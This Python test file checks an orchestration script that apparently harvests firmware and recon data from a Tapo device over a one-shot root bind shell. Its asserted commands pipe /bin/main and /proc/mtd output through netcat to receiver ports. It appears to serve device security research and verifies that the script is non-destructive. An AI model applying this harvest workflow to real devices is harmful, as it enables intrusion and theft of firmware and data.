#!/usr/bin/env python3
"""Orchestration test for deliverables/scripts/tapo_root_harvest.sh against a fake shell.

The real shell is one-shot (tapo_bind4444.S accepts once and becomes /bin/sh), so the harvest has
exactly one connection to get everything right. This test stands in for the device: it accepts the
script, asserts the contract the device depends on, and replays the exfil streams to the receivers
in the order the script asks for them.

What is under test is the orchestration — receivers bound before the connection, one-shot ordering,
partial files promoted only when non-empty, exit codes, and the guard. Not the device.
"""
from __future__ import annotations

import os
import pathlib
import socket
import subprocess
import sys
import tempfile
import threading
import time
import unittest

ROOT = pathlib.Path(__file__).resolve().parents[1]
SCRIPT = ROOT / "deliverables" / "scripts" / "tapo_root_harvest.sh"

MTD = b"dev:    size   erasesize  name\nmtd0: 00040000 00010000 \"boot\"\nmtd1: 00f00000 00010000 \"rootfs\"\n"
MAIN = b"\x7fELF" + bytes(range(256)) * 40
RECON = b"### recon\n" + MTD


def free_port() -> int:
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    p = s.getsockname()[1]
    s.close()
    return p


class FakeShell:
    """Accepts one connection, records the script, replays the exfil streams."""

    def __init__(self, ports: dict[str, int]) -> None:
        self.ports = ports
        self.script = ""
        self.srv = socket.socket()
        self.srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.srv.bind(("127.0.0.1", 0))
        self.srv.listen(1)
        self.port = self.srv.getsockname()[1]
        self.thread = threading.Thread(target=self._run, daemon=True)

    def start(self) -> "FakeShell":
        self.thread.start()
        return self

    def _send(self, port: int, blob: bytes) -> None:
        for _ in range(50):
            try:
                s = socket.create_connection(("127.0.0.1", port), timeout=2)
                break
            except OSError:
                time.sleep(0.1)
        else:
            raise AssertionError(f"receiver {port} never accepted")
        with s:
            s.sendall(blob)

    def _run(self) -> None:
        conn, _ = self.srv.accept()
        with conn:
            conn.settimeout(5)
            buf = b""
            while True:
                try:
                    d = conn.recv(4096)
                except socket.timeout:
                    break
                if not d:
                    break
                buf += d
            self.script = buf.decode()
            conn.sendall(b"uid=0(root) gid=0(root)\nLinux (none) 4.9.84 #1 SMP armv7l\n")
            # replay in the script's own order
            for line in self.script.splitlines():
                if "nc " not in line:
                    continue
                port = int(line.rsplit(" ", 1)[1])
                if port == self.ports["mtd"]:
                    self._send(port, b"### mtd0\n 00 00 00 00\n### mtd1\n 68 73 71 73\n")
                elif port == self.ports["main"]:
                    self._send(port, MAIN)
                elif port == self.ports["recon"]:
                    self._send(port, RECON)
            conn.sendall(b"HARVEST-DONE\n")
        self.srv.close()


class HarvestTest(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp = tempfile.TemporaryDirectory()
        self.out = pathlib.Path(self.tmp.name) / "out"
        self.ports = {"main": free_port(), "mtd": free_port(), "recon": free_port()}

    def tearDown(self) -> None:
        self.tmp.cleanup()

    def run_harvest(self, shell_port: int, **env: str) -> subprocess.CompletedProcess:
        e = dict(os.environ, FORCE="1", HOSTIP="127.0.0.1", OUTDIR=str(self.out),
                 SHELL_PORT=str(shell_port),
                 P_MAIN=str(self.ports["main"]), P_MTD=str(self.ports["mtd"]),
                 P_RECON=str(self.ports["recon"]), WINDOW="8", **env)
        return subprocess.run(["bash", str(SCRIPT), "127.0.0.1"],
                              env=e, capture_output=True, text=True, timeout=60)

    def test_harvests_every_stream_in_one_connection(self) -> None:
        fake = FakeShell(self.ports).start()
        res = self.run_harvest(fake.port)
        self.assertEqual(res.returncode, 0, res.stdout + res.stderr)
        self.assertEqual((self.out / "main.bin").read_bytes(), MAIN)
        self.assertEqual((self.out / "recon.txt").read_bytes(), RECON)
        self.assertIn(b"### mtd1", (self.out / "mtd_heads.txt").read_bytes())
        self.assertIn("uid=0 confirmed", res.stdout)
        self.assertIn("script ran to completion", res.stdout)
        self.assertFalse(list(self.out.glob("*.part")), "partial files must be promoted or gone")

    def test_script_contract(self) -> None:
        fake = FakeShell(self.ports).start()
        self.run_harvest(fake.port)
        s = fake.script
        self.assertIn("id > /tmp/h.log", s)
        self.assertIn("cat /proc/mtd", s)
        self.assertIn("dd if=/dev/$d bs=4096 count=1", s)
        # the awk program must survive the device shell: single quotes, or $1 is expanded away
        self.assertIn("awk 'NR>1{print $1}'", s)
        self.assertIn("cat /bin/main | nc 127.0.0.1", s)
        # the binary is last: the shell dies with the connection
        self.assertGreater(s.index("cat /bin/main"), s.index("cat /proc/mtd"))
        # nothing destructive
        for cmd in ("rm ", "flash_erase", "mtd_debug write", "> /etc"):
            self.assertNotIn(cmd, s)

    def test_no_shell_exits_3(self) -> None:
        res = self.run_harvest(free_port())
        self.assertEqual(res.returncode, 3, res.stdout + res.stderr)
        self.assertIn("no shell", res.stdout)

    def test_absent_unit_exits_2_without_force(self) -> None:
        res = subprocess.run(["bash", str(SCRIPT), "192.0.2.1"],
                             env=dict(os.environ, OUTDIR=str(self.out), WINDOW="3"),
                             capture_output=True, text=True, timeout=60)
        self.assertEqual(res.returncode, 2, res.stdout + res.stderr)
        self.assertIn("not in ARP", res.stdout)


if __name__ == "__main__":
    unittest.main(verbosity=2)
